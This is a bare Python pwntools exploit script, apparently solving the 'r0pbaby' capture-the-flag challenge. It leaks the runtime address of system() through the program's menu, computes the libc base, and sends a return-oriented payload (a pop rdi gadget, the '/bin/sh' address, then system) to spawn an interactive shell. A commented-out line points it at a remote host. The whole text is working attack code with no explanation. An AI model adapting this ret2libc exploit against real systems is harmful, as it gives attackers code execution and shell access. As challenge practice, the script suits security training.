from pwn import *

bin = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc_system = bin.symbols['system']
print('[*] libc system address: 0x%016x' % libc_system)
libc_binsh = next(bin.search('/bin/sh'))
print('[*] libc /bin/sh address: 0x%016x' % libc_binsh)
pop_rdi_ret = 0x00022b9a

proc = process('./r0pbaby')
# proc = remote('127.0.0.1', 4444)

proc.recvuntil('4) Exit\n: ')
proc.sendline('2')
proc.recvuntil('Enter symbol: ')
proc.sendline('system')
proc.recvuntil('Symbol system: ')

system_addr = int(proc.read(18).strip(), 16)
print('[+] Got system address: 0x%016x' % system_addr)
libc_base = system_addr - libc_system
print('[+] Got libc base address: 0x%016x' % libc_base)
binsh_addr = libc_base + libc_binsh
print('[+] Got /bin/sh address: 0x%016x' % binsh_addr)
rop_addr = libc_base + pop_rdi_ret
print('[+] pop rdi; ret : 0x%016x' % rop_addr)

payload = 'A'*8
payload += p64(rop_addr)
payload += p64(binsh_addr)
payload += p64(system_addr)

proc.recvuntil('4) Exit\n: ')
proc.sendline('3')
proc.recvuntil('Enter bytes to send (max 1024): ')
proc.sendline('%d' % len(payload))
proc.sendline(payload)
proc.sendline('4')

proc.interactive()
